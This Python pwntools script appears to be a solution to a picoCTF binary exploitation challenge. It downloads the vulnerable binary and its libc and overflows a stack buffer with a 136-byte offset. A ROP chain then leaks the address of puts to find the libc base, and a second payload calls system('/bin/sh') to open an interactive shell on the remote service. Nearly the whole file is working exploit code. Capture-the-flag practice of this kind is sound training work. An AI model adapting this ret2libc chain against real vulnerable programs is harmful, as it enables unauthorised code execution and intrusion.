#!/usr/bin/env python3

from pwn import *
import os

wget("https://mercury.picoctf.net/static/db3de64aff99326d98a0a12efcc57e7b/vuln", "vuln")
wget("https://mercury.picoctf.net/static/db3de64aff99326d98a0a12efcc57e7b/libc.so.6", "libc.so.6")
wget("https://mercury.picoctf.net/static/db3de64aff99326d98a0a12efcc57e7b/Makefile", "Makefile")
os.system('pwninit')

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
rop = ROP(exe)

def conn():
    if (len(sys.argv) > 1 and sys.argv[1] == "remote"):
        r = remote("mercury.picoctf.net", 23584)
    else:
        r = process([exe.path])

    return r


def main():
    r = conn()

    r.recvline()
    offset = b'A' * 136
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    ret = rop.find_gadget(['ret']).address

    payload = offset
    payload += p64(pop_rdi)
    payload += p64(exe.got['puts'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.symbols['main'])
    r.sendline(payload)
    r.recvline()
    puts_addr = r.recvline().strip()
    puts_addr += b'\x00' * (8 - len(puts_addr)) # fill leading zero be
    puts_addr = u64(puts_addr)
    libc.address = puts_addr - libc.symbols['puts'] # calculate libc base adress

    payload = offset
    payload += p64(ret) # add ret for stack alignment
    payload += p64(pop_rdi)
    payload += p64(next(libc.search(b'/bin/sh\x00')))
    payload += p64(libc.symbols['system'])
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
